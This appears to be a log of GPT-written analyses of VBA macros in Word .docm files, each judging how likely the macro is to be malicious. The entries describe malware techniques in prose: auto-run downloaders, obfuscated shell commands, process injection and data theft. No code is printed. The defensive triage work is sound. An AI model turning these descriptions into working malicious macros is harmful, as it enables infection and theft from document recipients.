The presence of obfuscated code, the disabling of alerts, interacting with ComboBox controls in several UserForms, opening external workbooks, reading data from it, and executing methods using CallByName are all flags for potentially harmful behavior. 

In conclusion, based on the above evidence, it can be estimated that there is an 85% probability for this code to be malicious. It is highly recommended to perform a deeper investigation using advanced static and dynamic analysis techniques and to not run this code in an uncontrolled environment before that.
================================================================================

File: 48.docm
GPT's analysis:
The above VBA code appears to be malicious. Here's why:

1. The code reads as relatively obfuscated, with function and variable names that don't suggest they're part of any standard software. This implication of hiding the code's actual purpose rings quite suspicious.

2. In the `Document_Open` method, the code calls the `Heraklion` function when the document is opened. This function then retrieves an ActiveDocument.Variables value and passes it to the `TenTier` function, which indicates that information stored within the document is being processed and used, a common red flag.

3. The most concerning part is the `Subreligion` subroutine, where it is using the `GetObject` method along with WMI (Windows Management Instrumentation, demonstrated by `winmgmts` and `Win32_Process`) to create a process. It looks as though it builds a string to target the Root CIMV2, then tries to execute a process. 

4. If certain conditions are met, it runs whatever command is passed in the `Tubercularised` parameter. If no command is passed into the function, it creates a new `calc.exe` process as a fallback, which is a benign process itself, but its automatic execution when certain conditions are not met can be potentially suspicious.

Based on these elements, I can say there's about a 90% chance the script is malicious or could be potentially used for malicious purposes. Actual harm might depend on how this script integrates with the rest of the application, the intent of the operator, and what commands it tries to execute.

GPT's analysis:
The given VBA code appears to be a simple macro used within a Word document. It's designed to loop through all paragraphs in the active document, and if the paragraph style matches a specific heading level (in this case, Heading 2), it applies some formatting to the text (changes the color to blue and makes it bold). After the operation, it triggers a message box to confirm that the operation was successful.

In this analysis, there are no harmful operations or suspicious activities such as reading/writing files, manipulating system settings, accessing the network or creating/deleting system resources. All actions are strictly related to document content formatting. Therefore, there is no indication that this code could be harmful based on the currently available information. 

Based on this analysis, the risk level of this code being malicious is estimated to be 0%. However, this is subject to change if the use context of this code changes or additional information about its use becomes available. Users should always be cautious when using macros and ensure they trust the source.

File: 135.docm
GPT's analysis:
The given VBA code is very suspicious and exhibits numerous characteristics typically associated with malicious macros, such as:

1. Use of multiple object creations via `CreateObject`.
2. Usage of `CallByName` which is a method often used to bypass rather simple signature-based detections by executing commands indirectly.
3. The code manipulates external documents and possibly executes methods from them, such as `UserForm1.md & UserForm1.n3` etc.
4. There are obfuscated variables throughout the code.
5. It has multiple `On Error Resume Next` instructions which are usually used to ignore errors produced by malware so it can continue to run.
6. It performs actions on close of the document, which may indicate an attempt to perform actions after user interaction.

However, there are some details lacking, such as what operations are being performed, actual variable values and the result of some operations are not clear, e.g., `UserForm1.hor & UserForm1.b0a`. Without this information, the analysis is not 100% conclusive.

Therefore, based on the given code and similarities to known malicious characteristics, there is a high probability that the code is malicious. Estimated likelihood is probably close to 80-90%. However, the assessment might be wrong if the missing information holds benign operations. A thorough dynamic analysis in a controlled environment would provide a more accurate result.
================================================================================

GPT's analysis:
This code definitely appears suspicious and may contain malicious content. Here are the reasons:

1. The VBA script is performing XOR operations, which are often used in obfuscation or encryption of code or data, potentially to bypass malware detection systems. It is usually a red flag when it comes to analyzing a potentially malicious VBA code.

2. The script creates a file named 'mailform.js' into the user's appdata\Microsoft\Windows folder, which is atypical for a standard VBA macro. This could potentially be scripting malware.

3. The VBA script uses the ‘AutoOpen’ and ‘AutoClose’ commands, which are often used in malicious macros to execute code upon opening and closing of the document. 

4. The script also makes numerous calls to system environment variables and performs filesystem manipulations. This behavior is typically observed in malicious VBA macros.

5. The script appears to be scanning the contents of the active document using a regular expression, which might be an attempt to extract or manipulate specific information.

6. Error handling operations are designed to suppress any runtime errors, preventing the user from being alerted to its actions.

Based on these observations, there's a high likelihood that this VBA macro is malicious. I would estimate this at 90% - 95%. The reason I'm not saying 100% is microbes could, in some circumstances, use comparable methods for legitimate purposes. Detailed dynamic analysis or reverse engineering would be required to confirm the full intent of this script. Always practice caution when dealing with macros from untrusted sources.

This VBA code appears to be benign based on the given details. The macro named "AddTableRow" in the "Module1" is simply adding a new row to an existing table in the active Word document with specific text content. After the action, it displays a message box saying "A new row has been added to your table."

The first macro - "ThisDocument" - only contains metadata about the VBA project, such as its name, source, global namespace status, whether it can be created outside VBA, and its exposure status. There are no actions being taken that could potentially be harmful to the system or user data.

As an IT security analyst, I would say this code has a 0% likelihood of being malicious based on the provided information. It merely manipulates Word document content. However, it should be noted that security best practices should always be observed. Other potentially harmful or suspicious code not shown in this extract could be present in the application.

1. The script checks for the existence of a file named '.gattaka' and shows a message box with an error when it exists. This could potentially be a kind of protection or check mechanism for the malicious activity.
2. The script contains methods that perform binary operations and work with byte arrays, which could be used to manipulate data in a concealed way.
3. One of the most suspicious behaviors is a functionality that aims to create a new Scripting.Dictionary object. This method can be used to store different key-value pairs and lead to executing another malware upon successful exploitation.
4. The script seems to hide its true nature with random names of procedures and functions and with complex and nested functionality.
5. The function zwxcnxajcshyp seems to prepare and execute a function in a new object possibly leading to exploitation of the system's scripting dictionary object.

While it's difficult to determine an exact percentage of how likely it is to be malicious based on just the code, taking into account these factors, I would say the likelihood is quite high, approximately 90%. A definite conclusion would require additional context, input data, and testing in a secure environment.

GPT's analysis:
This VBA code has some highly questionable and likely malicious behavior. It includes features such as:

1. The creation and execution of files: The procedure `raeozmfjnymq` shows the potential for this code to create a binary file via the `Open` command using a given string as file path. Then later on in the procedure `zwxcnxajcshyp`, the code attempts to call a program via `GetObject`.
2. Use of obfuscation: Having randomly generated function and variable names, as well as hard-coded strings being deobfuscated via charset conversion inside `rrhzspxkphvvy` makes it extremely difficult to determine the exact functionality of the code and is generally indicative of code trying to evade detection.
3. Use of ActiveDocument.CustomXMLParts: This can be a technique to hide data in XML parts of the document or to retrieve potentially sensitive data from there.
4. Use of error messaging: This code is utilizing message boxes to display critical errors giving indication of possible pseudo-ransomware or scareware characteristics.
5. Evaluates environment: The presence of a file named ".gattaka" is checked multiple times and alternative behavior is selected if it exists, which indicates that the code is looking for a specific environment.

However, without thorough understanding of what all strings deobfuscate to (various strings are being translated within the function `rrhzspxkphvvy`, the targeted file type (specifically what ".gattaka" is) and without knowing the entire codebase it originates from, it is hard to provide a definite percentage estimate of malignancy.

But considering all the mentioned suspicious behaviors and techniques, while the presence of potentially harmful actions doesn't guarantee malicious intent, the likelihood of this code being malicious is quite high. A rough estimate would be around 90% and further investigation is highly recommended.
================================================================================

GPT's analysis:
This VBA code appears to be 100% malicious. 

The macro uses certain attributes such as VB_Creatable, VB_Exposed and VB_Customizable set to True, which are signs that it allows interaction with other languages and environments, creating a possibility for exploiting.

The code is executed when the document is opened using the Document_Open() subroutine. It includes a block of obfuscated code, splitting across three variables (asds, asds2, asds3). The hexadecimal values in quotes are input strings for some function which encodes the string.

Upon decoding the hexadecimal strings represented in the asds, asds2 and asds3 variables, we can see that it tries to execute powershell with an execution policy bypass, it downloads a file from a web address, and it runs an executable file from the system's temp directory. 

The IUOKPLMNqeUAQJPckVESMLyCEqrOeIEgxkIjtEMNbzKwIDHEjXDUpiw function is used to convert those hexadecimal strings into the actual ASCII commands. 

The CreateObject("WScript.Shell").Run (asds) command is used to execute the command stored in the 'asds' variable. 

Overall, the code seems to use obfuscation and downloads and executes a file from an external source, these are characteristics of a malicious script used to distribute malware.
================================================================================

GPT's analysis:
This VBA code contains several malicious indicators and likely constitutes a harmful threat with a 100% chance of being malicious. The analysis of the behavior as follows:

1. The use of random and meaningless function and variable names suggests an attempt to obfuscate the code's true intentions.
2. The functions hgmneqolwgxg, jmkrohkvctnt, and lylhbzknnnzm convert hexadecimal strings into their character equivalents, which is a common obfuscation technique used in malicious scripts. These functions are most likely used to hide URLs or file paths.
3. In the "avscuqctk" subroutine, the URL and file names are built using the obfuscation method above and an HTTP GET request is performed on the URL. If the HTTP response status is 200 (OK), the response body is written to a file in the TEMP location path and then executed.
4. The "cuabumrbh" subroutine is essentially using the "Shell" command to execute a given string as a command line instruction which potentially could execute defensive evasion or malicious download.
5. The "cwzbjoiuq" and "lkxosgcqm" subroutines further involve complex obfuscation and the use of the Windows Management Instrumentation (WMI) scripting interface, possibly to hide malicious activities or to execute code.

These aforementioned behaviors are all indicative of a stealthy download and execution of potentially malicious code.

GPT's analysis:
The given Visual Basic for Applications (VBA) code has potential harmful actions that can be malicious with nearly 100% certainty. 

This VBA code comprises a macro which makes use of the advapi32 API to get the current user's username. It then sends that username to a remote server through "MSXML2.ServerXMLHTTP." The URL that it is posting to is obscure and raises concerns. Sending sensitive information, like a username, to an external and untrustworthy server is a major privacy and security risk, likely a keylogger or data stealing attack.

Finally, the script runs the "SecureRevealInfo" subroutine automatically whenever the file is opened via the "AutoOpen" method, making it effortless to trigger the potential data theft without the user's permission or awareness.

As a final note, always be careful with macros in Microsoft Office applications. They can carry potentially harmful codes and commands. If the source is unknown or not trusted, it's better to avoid running them.
================================================================================

File: 114.docm
GPT's analysis:
This VBA code seems suspicious and potentially harmful for several reasons. 

1. The code in the "asovivair_eywedr" subroutine appears to be doing manipulations with files on the user's computer, specifically creating and managing files and directories in the user's "Downloads" directory.

2. The code creates objects of the "Shell.Application" and "Scripting.FileSystemObject" types, which are used for manipulation of the file system and execution of shell commands.

3. The code is written in a way to obscure its actions, which is a common tactic used in malicious scripts. It uses complex strings concatenation techniques and the "Replace" function to build file and directory names, which makes the code harder to understand.

4. It executes files with the "Shell" command. This can potentially execute harmful files. 

5. The 'Document_Open' event gets triggered when the document gets opened which means the objective of the code is to execute when the document is opened.

6. Other functions like: Document_BeforeClose, Document_ContentControlOnExit, Document_Calculate, Document_Sync, and Document_WindowResize are not doing anything malicious currently but their presence and their attached subroutine can be used for a malicious intent later on. 

Based on these points, I would estimate a 75-85% probability that this code is malicious. It may not directly harm the user's system but it does have the potential to facilitate harmful actions through file manipulations or indirect system changes. Additional context or explanation from the code's authors would be needed to lower this estimate.
================================================================================

GPT's analysis:
The provided VBA code appears to have harmful intentions and I would estimate the potential for being malicious to be 100%.

1. It's creating and modifying files in the users' folder and Windows system folder. These files have suspicious names like "changeMyParent.exe", "runPoshCode.dll", and "BEACON.ico".

2. The process names such as "rundll32.exe", "explorer.exe", and reference to "Win32_Process" suggest that this code is attempting to manipulate or impersonate system processes, a common tactic used by malicious code to avoid detection or gain elevated privileges.

3. The code attempts to spawn new instances of Win32_Process and runs scripts. This is another common tactic in malicious code used to execute harmful operations.

4. Lastly, this macro will run when the workbook or Word document is opened with the 'AutoOpen' and 'Workbook_Open' functions.

Considering all these actions, this code justifies identifying it as malicious. You should use tools such as up-to-date antivirus software to thoroughly scan and protect your system against this kind of threat.
================================================================================

File: 39.docm
GPT's analysis:
Based on the analysis of the provided VBA code, there are several harmful and suspicious operations performed within it. 

1. It uses the "Shell" command to execute external commands. The parameters of "Shell" are encoded and obfuscated strings, which make it difficult to see what commands are actually being executed without performing further analysis.

2. The VBA code contains a function (oMuQsbKuRemNUotZfIedPnPXbRbqFBIAwLbSoUdhEuOgQpiwVQYYnEu) that appears to manipulate strings, likely for obfuscation purposes, which is a common technique used in malicious VBA macros.

3. The code has the "CreateObject("Excel.Application")" that is often used to instantiate an instance of an Excel object, which can be used to perform harmful actions such as writing or reading files.

4. The macro is run when the document is opened, which is a common delivery mechanism for malicious VBA code.

Given these factors, it is very likely (around 90%) to be malicious. To confirm this assessment, the encoded/obfuscated strings would need to be deciphered in order to determine the actual commands being executed, and further investigation on exactly what Excel application object is being used to do. It should be regarded as highly suspicious and potentially harmful until it can be fully vetted.
================================================================================

File: 53.docm
GPT's analysis:
The above VBA code seems to exhibit certain characteristics that are often associated with malicious macros. Here are some concerning factors present in the code:

1. It includes an "autoopen()" subroutine, which is frequently used in malicious VBA macros to automatically execute code upon document opening.

2. A function named "TlfFormat" is noticeable where it's making changes to an existing file or creating a new one and performing possibly malicious actions such as saving files or running a dynamic-link library (DLL) using Shell command which can cause potential harm to the system.

3. The code contains obfuscated function names and variables, a common approach to hide the real intentions of the code.

4. The code includes calls to 'CreateObject' method, which is used to instantiate objects from an ActiveX component or a library, enabling interaction with system resources or other applications - but can also be used for harm.

5. HTTP requests that retrieve data and write to a file, such operations can be used for data theft / exfiltration.

Remember that while these points are suspicious, they do not inevitably insinuate that the macro is malicious. It's possible that these are used for legitimate purposes.

However, as an IT security analyst, given the obfuscation,use of autoopen(), potentially dangerous file operations, this bears a very strong resemblance to a typical malicious document macro. I would assign 90% chance of it being malicious, but recommend conducting a complete analysis using proper tools before taking any action.
================================================================================

File: 61.docm
GPT's analysis:
The VBA code seems to be doing a lot of manipulation with custom strings and arrays. It first checks if a file by the name ".gattaka" exists (probably an untypical file name chosen as a hidden marker or identifier). 

The function lcjsxjbkldksstie creates an array of random bytes. In function zwxcnxajcshyp, code attempts to fetch custom XML parts from the document, decodes them, and writes result to a file in binary format.

It then uses a WMI object to create a process that likely executes this created file. More precisely, it uses the Win32_Process WMI class to create a new process, presumably to run the executable crafted from custom XML parts. 

The randomness in the code appears to be a technique typically seen in polymorphic code, a tactic often used by malicious codes to avoid signature-based detection. 

Hence, it ranks high in terms of potential harmfulness. I'd estimate at least an 85% likelihood of malicious intent based on these indicators. You should definitely treat this with caution and further investigate.

Based on the provided VBA code, there don't appear to be any harmful actions. The code simply instructs Word to convert selected text to upper case. This macro runs only if some text is selected. If not, it will show a message box with a prompt to select some text first. There is no suspicious activity such as manipulation of files, accessing the network or system resources, linking with other scripts, or writing data outside of the document, etc. 

Percentage of this code being malicious: 0%. 

Please note, the analysis is provided for this exact code sample only and doesn't guarantee the overall safety of the complete VBA macro or the document in which it is embedded, if there's more code than what is shown. Always be cautious while running macros when you are unsure about their source or contents.
================================================================================

File: 74.docm
GPT's analysis:
This VBA code is likely highly malicious (Estimated Risk: 95%). Here's why:

This code is designed to execute automatically upon the open event of a document through `AutoOpen()`, which is a common tactic used in malicious documents.

Next, it retrieves some value from the document's built-in properties particularly from the comments section of the document, it invokes `Base64Decode` on that value, and depending on the operating system, it executes the decoded payload through `ExecuteForWindows()` or `ExecuteForOSX()`. This method of attack is quite stealthy and dangerous, because it hides the payload in the properties of the document where an average user would not check.

In `ExecuteForWindows()`, it creates a new executable file in the temporary folder with the content of the decoded payload from the properties and executes it. This is a direct malicious behavior as it results in executing unwanted arbitrary code potentially leading to harmful actions.

In `ExecuteForOSX()`, it invokes a system function to execute the payload. The payload is piped to python interpreter to execute, essentially running arbitrary code on the system.

This could be used to create a backdoor, ransomware, or take other forms of malicious action including data theft. For these reasons, the code should be considered highly malicious.

Based on the given VBA code, there do not appear to be any malicious activities. The code is primarily used for managing and printing a barcode within a Microsoft Word document. It does not seem to have any hidden functionality, data extraction methods, or connections to external servers, which are usually found in malicious scripts.

The FilePrint and FilePrintDefault subroutines are simple replaces for normal printing processes, with a minor addition of setting the barcode before each print job. It doesn't appear to affect or tamper with any other system or file operations.

However, while the macro itself seems harmless, that does not exempt it from being used as a part of a broader malicious operation if embedded in a document with hidden or additional harmful code. Therefore, we typically recommend users only open macros from trusted sources.

As far as the given code is concerned, it is likely to be benign with a roughly 0% chance to be malicious, based on its current form and functionality. Always keep in mind that the context and source of code affect the final threat assessment.

Based on the provided VBA code, it seems that the code is intended to automatically resize and organize images within a document. It does not contain any suspicious or harmful functionalities like file deletion, system command execution, data extraction, or network communication, all of which are common in malicious macros. 

So, this VBA code is 0% likely to be malicious but as always, one must consider the broader context for definitive analysis. An analyst should consider this code in the greater scope of all code running on the system, as well as any related user behaviors or network traffic.
================================================================================

File: 115.docm
GPT's analysis:
This script looks suspicious and potentially harmful. From the simplified analysis it's clear that:

1. This script creates a file and writes binary data to it based on the contents of the document it is embedded within.
2. The script also has the ability to lockdown the system, spawning an instance that executes the scripts inside the system.
3. Some string values have been obfuscated using a simple substitution cipher, which is a common tactic used by malicious scripts to avoid detection.
4. The presence of checking for ".gattaka" file, as well as the creation and execution of binary files, suggest that this could be a part of ransomware or other malicious software.

However, to fully understand the depth of its potential maliciousness, more detailed analysis through reverse engineering the obfuscation techniques would be necessary. For now, given the elements present that are common in malicious scripts, I would estimate around 80%-90% likelihood of this being harmful.
================================================================================

File: 54.docm
GPT's analysis:
This VBA code seems to be a part of Word macro, it has two suspicious parts:

1. It contains a method AutoOpen, which will automatically run as a Word document opens.
2. Inside this AutoOpen method, it tries to run any program using the Shell command. Specifically, it's trying to run "conhost.exe calc.exe".

Conhost.exe is a legitimate process that you will find running in your Process tab in Task Manager. However, the malware or viruses intentionally disguise themselves as the conhost.exe to escape detection.

Also, it's trying to calculate the number of cores in your computer's processor. If the processor has more than one core, it executes the command "conhost.exe calc.exe". The exact reason for this check is unclear from the code provided. 

While the script's actions might not directly cause harmful effects (since it doesn't seem to download or execute obviously malicious files), its behavior is indeed very suspicious. This might be an obfuscated approach to implementing malicious behavior as it hides the fact that it's running a command on a shell and checking on system properties.

Thus, I'd estimate there's about an 70% chance that this macro is malicious, depending on the context in which it's found. If this code is found in an unexpected place such as a document from an unknown source, the chance of it being malicious could be closer to 100%. In general, any document that runs macros upon opening, especially those that conduct system checks or run external commands, should be approached with caution.
================================================================================

File: 121.docm
GPT's analysis:
After a careful analysis of the VBA code provided, it is determined that the likelihood of this code being malicious is estimated at 80%. This conclusion is based on several indicators such as:

1. The presence of obfuscated variable names, which may often be used by malicious actors to hide their intentions.
2. The use of "On Error Resume Next" which can potentially allow the code to bypass errors and continue its execution, typically used to avoid detection or issues if part of the code fails.
3. The code attempts to open and manipulate documents and workbooks through "Set snk = CreateObject(UserForm1.ComboBox1)" and "Set jet4 = snk.Workbooks.Open(FileName:=UserForm2.ComboBox1, Password:=UserForm1.ComboBox2)" which could be indicative of attempts to extract, alter, or inject data.
4. The use of the "CallByName" function, which allows the execution of a method or function stored in a variable. This can be used to obfuscate malicious actions.

However, the sample does not contain explicit deletion of files, modification of system settings, network communication, or similar actions that are indisputably malicious. Considering these factors, while there are significant suspicious signals, it must be mentioned that there is not a 100% certainty for malicious intent. Therefore, the estimate of 80% is given.

It is recommended to conduct in-depth dynamic analysis by running the code in a safe and isolated environment for a definitive conclusion.

GPT's analysis:
Given that this script silently creates, manipulates and executes files without clear and specific user benefit or consent, I would rank it as 85% likely to be malicious. 

Analyzing the code, these are the suspicious activities:

- It uses strange, unconventional, and obfuscated variable and function names, which are common signs of an attempt to evade detection or human understanding.
- The script has an encoding-decoding function (DecodeBase64), which usually used to obfuscate malicious code or data.
- It creates a new object ("CreateObject"), a common way to use functionality from external libraries, which could be abused for running harmful actions.
- The script also modifies environmental variables and output data silently (".ExpandEnvironmentStrings").
- It executes a command using `CreateObject().Exec` - this command execution can execute virtually anything and is a very high risk.

Whilst it is not 100% certain this is malicious (as we don't know the result of the function calls), the obfuscation, strange naming conventions, writing/reading of files and potential execution of a command are all highly suspicious and could potentially be harmful actions that will negatively impact a user's system security.
================================================================================

File: 129.docm
GPT's analysis:
The provided VBA code appears suspicious due to several facts:

1. AutoOpen() subprocedure: This subprocedure gets executed as soon as the Word document is opened. This is quite commonly used in malicious macros.

2. Shell command: It is executing a shell command which can perform operations outside of the Word application. 

3. curl command: This is used to download a file from internet. The link provided as part of curl is an executable file (*.exe), which can potentially carry a harmful payload.

4. Execution of downloaded exe file: After the .exe file is downloaded, it's immediately executed which can lead to execution of potential harmful code on host machine.

Based on these factors, I would assess that there's a 90-95% chance that the code performs malicious activities. However, no malware analysis was completed, and not all uses of such commands are malicious. The target website and the downloadable file would need to be further analyzed to confirm if this is indeed harmful.
================================================================================

GPT's analysis:
The given VBA code includes a lot of mathematical operations, such as simulations and calculations based on Markov Chains, text manipulation, as well as functions for handling file paths and memory. It seems like it is meant to perform simulations based on a mathematical model and do some text manipulation.

However, there are some peculiarities. There's a function that appears to include a hidden Powershell execution command (Shell(GraphicsContext)). This command appears to be encoded as hexadecimal. The decoded hexadecimal command appears to download a file from a specific URL, and the file's name is 'binnn.exe'. After downloading this file, it starts the process. This kind of activity is very suspicious and is a common method for running malicious code.

There's also a function that seems to upload data to a particular URL.

Combining these facts, there is a high possibility that the script could be potentially harmful. I would estimate that the probability that the code is malicious is approximately 70%. I recommend a thorough and deep analysis of this code in a sandboxed environment before running it in your system.
================================================================================

File: 10.docm
GPT's analysis:
This VBA Macro is highly suspicious, with a 99% chance of being malicious. It displays several hallmark signs of being a potentially harmful script:

1. The VBA Macro uses the Microsoft.XMLHTTP object to launch a GET request to download a .gif file from an external server. The file is downloaded from a IP address, which is suspicious because most legitimate files would be downloaded from a trusted hostname.

2. After downloading the .gif file, it is saved to a specific location on the system, in this case, C:\Temp\.

3. The macro then uses WScript.Shell to rename this downloaded .gif file to an .exe file, which indicates that the .gif file is actually an executable (most likely malicious) disguised as an image file. Normal VBA Macros in Word documents would not perform a file download from an external server and rename it with different extension (especially to an executable), as this is a common tactic used by malware to deliver malicious payload.

4. The Shell command is used to execute the newly renamed .exe file, meaning it will run automatically as soon as the file has been renamed. 

5. Finally, this is all automated to run when the document is opened (AutoOpen).

All these suggest that this is not a legitimate use of a macro, but instead a covert way to download and execute malicious code. Be very wary of such scripts, as they can wreak havoc on an unsuspecting user's system. If you encounter this, report it to your IT department immediately.
================================================================================

File: 67.docm
GPT's analysis:
The provided VBA code contains several suspicious features that indicate it is likely to be malicious. It uses the Document_Open() hook, which can be utilized to trigger commands or procedures upon a document's opening, a common practice in malicious macros.

Additionally, the macro uses the Shell function to execute commands. The arguments passed to this function are obscured via an encoding algorithm within the nTAsTKFkducSzWPYLbSJfOHXlSLKIaDbvlGuMLZUPNKfPfHlvGjEblD function. While the specific contents are unreadable without decoding, this kind of obfuscation is common in harmful VBA code to both bypass security mechanisms and hinder human detection.

The macro utilizes the CreateObject("Excel.Application") command combined with the .Wait method to delay the execution of the subsequent code, possibly to evade sandbox detection that would typically time out the execution of the script.

Furthermore, it retrieves information about the user environment with the Environ function, which suggests it may be trying to acquire sensitive information or adjust its actions based on the specifics of the target system.

Based on the code's features, I would say there is a 90% likelihood this code is malicious. Please note, this is an estimation, and the potential harmfulness of the code would be confirmed only after more detailed analysis, decoding the obfuscated commands and observing its behavior in an isolated environment.

GPT's analysis:
This VBA code appears to have multiple characteristics of a potentially harmful application. It includes unclearly named variables and functions as well as dubious actions throughout that signify various aspects of malware functionality. Risky activities include:

1. The use of VBA's `CreateObject` to create a 'Scripting.Dictionary' object. This could be used for mapping purposes, but also to maintain or manage exploits.
2. The apparent presence of encoded or encrypted strings. These are often used to hide malicious intent from analysts.
3. The use of `ActiveDocument.CustomXMLParts` to potentially extract information from the Word document's XML structure, potentially sensitive metadata.
4. The use of `GetObject` to retrieve a reference to an Automation component, which can execute commands outside the VBA environment.
5. The use of `MsgBox` to display what could be deceptive messages.
6. Attempts to write binary data to an external file.
7. Creating an object and triggering it, possibly executing or spawning another process.

This code appears to conceal its actual functionality behind layers of obfuscation to deter analysis or detection. The routine `zwxcnxajcshyp` seems to be potentially launching a process or application with potentially harmful side effects. The absence of clear intent or proper commenting also raises suspicions.

Given the context, I would say there is a 90% likelihood that this code is malicious. These are primarily observations based on typical indicators of malicious code and your organization's security policy may warrant further, deeper analysis.
================================================================================

File: 2.docm
GPT's analysis:
Upon reviewing the given VBA code, various indicators suggest the potential for malicious activities:

1. It has obfuscated function and variable names, such as "bvhfkauw34gkagdfki", "dfloaswehortiwholehfolsihlkw", "fkahefowihlogjpsojgoisdh", "ndfqkhwfoia8tvfoaisgufoiqewgfiudgovlisvpoju", "dfjolirhoghwow", which do not have any meaningful context.

2. The code contains Web Query (QueryTables.Add) which may download data from a web page given by the filename. The operation of this query is also hidden.

3. There's a strange character replacement operation in the "ndfqkhwfoia8tvfoaisgufoiqewgfiudgovlisvpoju" subroutine that is performed on "s2" variable. Also, the function of this subroutine is implemented to run an obfuscated script.

4. In the function "dfjolirhoghwow", it opens a file (filename input) in Binary mode and reads its content. This might be an indication of reading a maligned file or any executable.

5. The Document_Open() event suggests that the code is triggered automatically when the document is opened, this is commonly used by harmful scripts to execute without the user's direct input.

From all the above observations, there seems to be a high probability of this VBA code being malicious. Based on the above information, if I were to assign a percentage estimate of how likely it would be malicious, I would rate it 85-90% likely to be harmful. There seems to be a few potential harmful operations going on which is a cause for concern. However, it is recommended to run this code in a secure environment and engage proper specialists for thorough code analysis.
================================================================================

File: 85.docm
GPT's analysis:
The given VBA code appears to be potentially malicious. Specific reasons why this code might be harmful include:

1. The code involves the creation of a temporary file using FileSystemObject (line 5 in Module1), which can be used to write and execute malicious scripts.

2. It calls out VBScript to run the created file (line 35 in Module1) which can be used to execute harmful functions on a victim's system.

3. It uses custom properties of the document (lines 11-17 in Module1) to form a line in the script file. It’s likely that these custom document properties may contain malicious data or script.

4. It is using WMI (Windows Management Instrumentation) to execute the VBS file (line 38 in Module1), hiding the file execution from the user.

After reviewing the VBA code and given the use cases, an estimate of 80%-100% likely for it to be malicious is appropriate. However, the actual percentage may differ based upon what is written in the document properties and the content that gets written to the temporary file. A complete assessment would require further investigation into these aspects, but I strongly recommend taking precautions when executing this code.
================================================================================

File: 101.docm
GPT's analysis:
The provided VBA code appears to contain several indicators of potentially malicious behavior, although comprehensive analysis would require a full understanding of its surrounding context. 

Mainly, suspicious actions include:

1. The use of obfuscated function names, variable names, and hex strings. This is often a technique to bypass detection by antivirus programs. 

2. It checks if a file named ".gattaka" exists in the directory and sends a message box warning if this file does exist. Depending on the context, this might be either benign procedural or a form of evasive behavior used by malware.

3. The "Document_Open" and "yoxtuitsmsvbjfepuxc" subroutines both call a function "zwxcnxajcshyp" with a True argument. This will be initiated as soon as the document is opened.

4. The script uses CreateObject to instantiate a Scripting.Dictionary object, which could potentially be used to execute or load malicious highly obfuscated scripts.

5. The "raeozmfjnymq" procedure opens a file for binary access and writes data to it. Adjustments to binary file data might be an evidence of malicious activity.

6. The "zwxcnxajcshyp" subroutine also calls a function "GetObject". This function is commonly used to instantiate COM objects, which can be used to carry out actions with elevated privileges.

7. "zwxcnxajcshyp" also uses the "Create" method, which is often used to create new instances of COM objects and can be used for malicious purposes if the objects created function to carry out malicious activities.

Based on these points, without a deeper contextual understanding, I would estimate the potential for this code to be malicious at around 75-85%. While the code could theoretically have benign uses, the presence of key COM object manipulations, binary manipulation, evasion technique, and obfuscation is concerning and raises significant red flags.

After analysis, the Visual Basic for Applications (VBA) code appears to be benign. It seems to be a simple VBA script designed to create a user form with name and email fields. When the user enters their information and submits the form, a message box displays the entered name and email.

The form does not seem to perform any harmful actions like sending the entered information to an external server, damaging or modifying files, or executing any form of malicious process. Although user data is extracted, it's simply displayed in a message box and not used or saved anywhere that could compromise the user.

However, it's important to note that there's always a risk with macros and scripts, as they can be altered or used as part of more complex harmful macros. Deceptive practices (like phishing) can also use benign forms to solicit sensitive information.

From the code alone, I would estimate a 0% chance of this code being immediately harmful. But considering the potential misuse of VBA scripts, I would recommend always asking users to exercise caution when running scripts received unexpectedly or from unknown sources.

The analyzed VBA macro code appears to be harmless. It appears to serve a simple function of finding all bold texts within a word document and changing them to italic. There is no indication of harmful instructions such as data theft, file manipulation outside the scope of the presented function, communication with servers, and other potentially malicious actions.

So, this gives an estimate of 0% chance that it is likely to be malicious. However as an IT Security Analyst, I would still advise to always be cautious and always check the source of macros due to the potential risk associated with macros in general.

GPT's analysis:
This VBA code appears suspicious as it contains various characteristics common in malware, such as obfuscated code, code related to file I/O, and usage of custom XML parts which can be an indication of data extraction techniques.

Observations:
1. The obfuscation with complex yet meaningless names is common for evading detection techniques used by some security solutions.
2. The 'GetObject' method is used to create instances of COM objects. This could be an indicator of potentially malicious behavior like command execution.
3. 'ActiveDocument.CustomXMLParts' is potentially used to extract XML data from the active document. This is a technique typically used to exfiltrate data embedded within a document.
4. The code seems to be creating a file with random name through 'raeozmfjnymq' subroutine and possibly executing it later using 'GetObject' method, this is extremely suspicious.
5. The code checks for a ".gattaka" file, depending on its existence it shows error messages or continues to run other suspicious activities.

Based on these characteristics, I estimate that there is a 90% possibility that the given VBA code is malicious. However, without complete context and running the code in an isolated environment (sandbox), giving a conclusion would be preliminary. It's recommended to perform further investigations.

GPT's analysis:
After analyzing the provided VBA code, it does not seem to contain any malicious activities. The macro, named "CreateContentIndex," simply generates an index table in a Word Document. It adds a two-column table at the end of the active document, providing terms and page numbers.

The script does not have actions that could potentially harm the system such as system command execution, file operation, registry manipulation, network communication, etc. It does not have any suspicious strings which could indicate harmful behavior. 

Given this information, I would estimate a 0% probability of this code being harmful or malicious in nature. 

However, it's essential to adopt the principle of least privilege for every piece of code running with certain permissions and secure coding practices to prevent potential exploitation of this macro for malicious use. Also, please ensure that the execution of macros is only allowed from trusted sources.

GPT's analysis:
Analyzing the provided VBA code, it is almost 100% certain to be malicious. This a clear example of a VBA macro intended to perform actions without the end user's consent or knowledge, indicative of malicious intent.

Below are some important reasons why the code can be considered harmful:

1. The use of "AutoOpen()" and "Workbook_Open()" functions: These functions are used to execute the code automatically when the Word or Excel file is opened by the user.

2. The code interacts with "kernel32", a Windows kernel library: This is indicative of potentially dangerous operations like memory allocation, creating processes, and writing to process memory. While not all interactions with kernel32 are malicious, the use of specific functions like "CreateRemoteThread", "VirtualAllocEx", and "WriteProcessMemory" are often indicative of behavior pertaining to running unauthorized software or injecting code into existing processes.

3. The use of "rundll32.exe": This system process is used to run code in DLL files. Malware often uses it to disguise malicious activities.

4. Hidden encoded content in a large array: The large number array that is written into memory appears to contain obfuscated or encoded content, another common technique used by malware to hide its actual function.

In summary, the VBA script is almost certainly malicious (close to 100%) based on the analysis provided. It's always important to scan received documents with up-to-date antivirus software before opening them, and always be cautious with macros within documents, even from known sources.

GPT's analysis:
After analyzing the VBA code, there are several actions that are suspicious:

1. In the `Initialize` subroutine, it checks for a file named ".gitingore". If it exists, a message box shows "This is an incompatible version, please, update." which might be a social engineering attack, aiming to trick the user into executing some additional action (although this message box is currently commented out - so not active). 

